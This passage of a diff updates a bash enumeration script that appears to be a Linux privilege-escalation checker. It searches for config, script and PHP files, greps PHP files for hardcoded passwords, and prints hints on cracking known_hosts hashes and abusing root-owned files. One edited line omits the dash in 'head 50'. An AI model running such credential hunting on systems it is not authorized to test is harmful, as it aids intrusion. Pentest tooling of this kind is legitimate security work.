-                cat /etc/ssh/ssh_config | grep "HashKnownHosts" --color=always
+            res="$(cat /etc/ssh/ssh_config | grep "HashKnownHosts no")"
+            if [[ $res == *"HashKnownHosts no"* ]]; then
+                echo -e "${GREEN}	No${XX}"
                 echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-                echo -e "\t║If no, then we can read the content of ~/.ssh/known_hosts and try to break the hash.                                ║"
+                echo -e "\t║We can read the content of ~/.ssh/known_hosts and try to break the hash.                                            ║"
                 echo -e "\t║    https://github.com/chris408/known_hosts-hashcat                                                                 ║"
                 echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+            else 
+                echo -e "${RED}	Yes${XX}"
+            fi
         else
             echo -e "${RED}	File does not exist${XX}"
-    fi
+        fi
 echo -e "\n${BLUE}╔═════{ sshd_config File:${XX}"
     if [ -f /usr/share/openssh/sshd_config ]; 
         then
@@ -3789,7 +3840,7 @@ echo -e "${RED} \t\t ═══════════════════�
 echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
 echo -e "\n"
 echo -e "\n${BLUE}╔═════{ Any odd files in :${XX}"
-echo -e "\n${BLUE}    ══{ Optional sofware application /opt:${XX}"
+echo -e "${BLUE}    ══{ Optional sofware application /opt:${XX}"
     ls -l /opt/
 echo -e "\n${BLUE}    ══{ Read-only user application /usr:${XX}"
     ls -l /usr/
@@ -3980,9 +4031,11 @@ echo -e "\n${BLUE}╔═════{ Tools/Languages Installed:${XX}"
 echo -e "\n${BLUE}╔═════{ Config Files:${XX}"
     find / -iname '*.config' -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
 echo -e "\n${BLUE}╔═════{ Bash Files:${XX}"
-    find / -iname '*.sh' -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/lib/\|/opt/firmware-mod-kit/\|/etc/console-setup/\|/etc/init.d/\|/etc/profile.d/\|/usr/share/"
+    echo -e "${BLUE}    ══{ Limit to 50:${XX}"
+    find / -iname '*.sh' -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/lib/\|/opt/firmware-mod-kit/\|/etc/console-setup/\|/etc/init.d/\|/etc/profile.d/\|/usr/share/" | head -50
 echo -e "\n${BLUE}╔═════{ Python Files:${XX}"
-    find / -iname '*.py' -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share/\|/usr/bin/\|/usr/lib/\|/usr/share/\|/usr/local/\|/var/lib/\|/opt/firmware-mod-kit/\|/opt/xplico/\|/opt/lib/|"
+    echo -e "${BLUE}    ══{ Limit to 50:${XX}"
+    find / -iname '*.py' -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share/\|/usr/bin/\|/usr/lib/\|/usr/share/\|/usr/local/\|/var/lib/\|/opt/firmware-mod-kit/\|/opt/xplico/\|/opt/lib/|" | head 50
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If the file is owned by root and can be executed by the current user, try to read it, maybe ║"
         echo -e "\t║the file can be exploitd by abusing it's library                                            ║"
@@ -3998,7 +4051,8 @@ echo -e "\n${BLUE}╔═════{ Any writable Python files:${XX}"
         echo -e "\t║    https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-friendzone/   ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ PHP Files 'Excluded /usr/ | /opt/':${XX}"
-    find / -iname "*.php" -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
+    echo -e "${BLUE}    ══{ Limit to 50:${XX}"
+    find / -iname "*.php" -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/" | head -50
 echo -e "\n${BLUE}╔═════{ Grep hardcoded passwords in *.php files:${XX}"
     find / -name "*.php" -print0 2>/dev/null | xargs -0 grep -i -n "var "$"password" --color=always
 echo -e "\n${BLUE}╔═════{ Text Files:${XX}"
@@ -4008,7 +4062,8 @@ echo -e "\n${BLUE}╔═════{ Text Files:${XX}"
         echo -e "\t║  /usr/*       |  /opt/       |  /etc/                                         ║"
         echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ HTML Files 'Excluded /usr/':${XX}"
-    find / -iname '*.html' -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/"
+    echo -e "${BLUE}    ══{ Limit to 50:${XX}"
+    find / -iname '*.html' -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/" | head -50
 echo -e "\n${BLUE}╔═════{ .GPG Files:${XX}"
     find / -iname '*.gpg' -type f 2>/dev/null | grep -v "/usr/\|/var/"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
